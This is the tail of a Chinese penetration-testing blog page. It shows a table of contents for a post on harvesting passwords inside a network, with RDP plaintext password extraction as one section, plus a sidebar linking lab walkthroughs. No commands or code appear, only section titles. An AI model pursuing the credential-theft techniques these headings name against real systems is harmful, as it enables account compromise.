href="#RDP%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96"><span class="toc-number">6.</span> <span class="toc-text">RDP明文密码抓取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%93%E5%8F%96%E5%AE%9E%E9%AA%8C"><span class="toc-number">6.0.1.</span> <span class="toc-text">抓取实验</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96RDP%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text">读取RDP明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A6%BB%E7%BA%BF%E8%AF%BB%E5%8F%96RDP%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text">离线读取RDP明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81"><span class="toc-number">6.3.</span> <span class="toc-text">读取系统应用密码</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/31/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/" title="内网密码抓取技术">内网密码抓取技术</a><time datetime="2023-10-31T03:20:41.000Z" title="发表于 2023-10-31 11:20:41">2023-10-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/20/upload-labs%20Pass1-21%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0%20/" title="upload-labs Pass1-21通关笔记(详细版)">upload-labs Pass1-21通关笔记(详细版)</a><time datetime="2023-10-20T08:17:02.000Z" title="发表于 2023-10-20 16:17:02">2023-10-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/13/Prime_Series/" title="Prime_Series">Prime_Series</a><time datetime="2023-10-13T05:44:36.288Z" title="发表于 2023-10-13 13:44:36">2023-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/12/Vulnhub-Sick0s1.1/" title="Vulnhub-Sick0s1.1">Vulnhub-Sick0s1.1</a><time datetime="2023-10-12T07:26:41.000Z" title="发表于 2023-10-12 15:26:41">2023-10-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/21/vulnstack%202/" title="VulnStack Pass-2">VulnStack Pass-2</a><time datetime="2023-09-21T13:02:41.000Z" title="发表于 2023-09-21 21:02:41">2023-09-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Drblack</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
